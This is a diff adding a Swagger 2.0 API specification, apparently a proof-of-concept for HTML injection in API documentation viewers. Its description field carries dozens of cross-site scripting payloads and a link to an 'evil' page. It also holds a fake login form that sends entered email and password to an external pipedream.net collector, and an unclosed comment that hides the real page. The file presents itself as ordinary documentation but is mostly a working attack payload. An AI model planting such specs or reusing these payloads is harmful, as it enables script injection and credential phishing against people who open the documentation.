@@ -1,0 +1,92 @@
+---
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |
+    <h1>Log in to see the full documentation</h1>
+    <img src="X" "onmouseleave=alert(1)">
+    <svg onload=confirm(1)>
+    <IMG SRC="javascript:javascript:alert(1);">
+    <IMG SRC=javascript:javascript:alert(1)>
+    <IMG SRC=`javascript:javascript:alert(1)`>
+    <SCRIPT SRC=%(jscript)s?<B>
+    <FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
+    <BODY ONLOAD=javascript:alert(1)>
+    <BODY ONLOAD=javascript:javascript:alert(1)>
+    <IMG SRC="jav    ascript:javascript:alert(1);">
+    <BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
+    <SCRIPT/SRC="%(jscript)s"></SCRIPT>
+    <<SCRIPT>%(payload)s//<</SCRIPT>
+    <IMG SRC="javascript:javascript:alert(1)"
+    <iframe src=%(scriptlet)s <
+    <INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
+    <IMG DYNSRC="javascript:javascript:alert(1)">
+    <IMG LOWSRC="javascript:javascript:alert(1)">
+    <BGSOUND SRC="javascript:javascript:alert(1);">
+    <BR SIZE="&{javascript:alert(1)}">
+    <LAYER SRC="%(scriptlet)s"></LAYER>
+    <LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
+    <STYLE>@import'%(css)s';</STYLE>
+    <META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
+    <XSS STYLE="behavior: url(%(htc)s);">
+    <STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
+    <h1><a href='https://evil-twinz.github.io/evil/'>clickme</a></h1>
+    <form action="https://envkwdnkgvs.x.pipedream.net" method="post">
+    <label for="email">Login:</label>
+    <input name="email">
+    <label for="password">Password:</label>
+    <input name="password">
+    <input type="submit" value="Login"></form><!--
+  version: production
+basePath: https://www.epas.de
+produces:
+- application/xml
+- application/json
+consumes:
+- application/xml
+- application/json
+security:
+- basicAuth: []
+paths:
+  "/test":
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - sometext
+      operationId: findAccounts
+      summary: this is example text
+  "/malformed_by_afine":
+    delete:
+      parameters:
+      - description: |
+          <noscript>
+
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - test
+      operationId: test
+      summary: test
+    get:
+      parameters:
+      - description: this is example text
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - s1rn3tz
+      operationId: some_operation
+      summary: this is example text
